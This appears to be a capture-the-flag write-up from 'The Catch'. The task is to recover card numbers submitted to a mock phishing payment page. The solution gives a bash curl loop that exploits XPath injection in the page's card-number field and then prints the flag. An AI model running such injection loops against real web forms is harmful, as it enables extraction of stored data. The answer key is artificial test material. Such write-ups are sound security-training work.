#### Challenge:

Hi, packet inspector,

we have a apparently problem with some fraudulent payment gateway (see forwarded e-mail). We suspect that many of our customers have come across this scam.

Identify all card numbers entered into the fraudulent webpage (we have to report incident and its details to CSIRT-TCC).

Download [fraudulent e-mail](./fraudulent_e-mail.zip ":ignore") (MD5 checksum `94c7696bed436cd63a490de4008d2022`).

May the Packet be with you!

---

#### Solution:

We are presented with payment web site. After tinkering with it we noticed that the `card number` field is vulnerable to `XPATH` injection.

```bash
{ for f in `seq 1 500`; do curl -Ss 'http://really.sneaky.phishing.thecatch.cz/?click=sjlk2fgj3oiervAnjkufho3uiKrmsd5xmoudfFdfDkrEn5ers4gj2nf35jvVxKdfjbq24weqfoeire24ge8' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data "card-holder-name=aaa&card-number=//*[${f}]+//*&card-expires-date=10%2F2022&card-cvv=111&proceed-to-pay=" | grep "This"; done; } | grep FLAG
```

---

<details><summary>FLAG:</summary>

```
FLAG{0BF0-RREd-vAK3-1Ayi}
```

</details>
<br/>
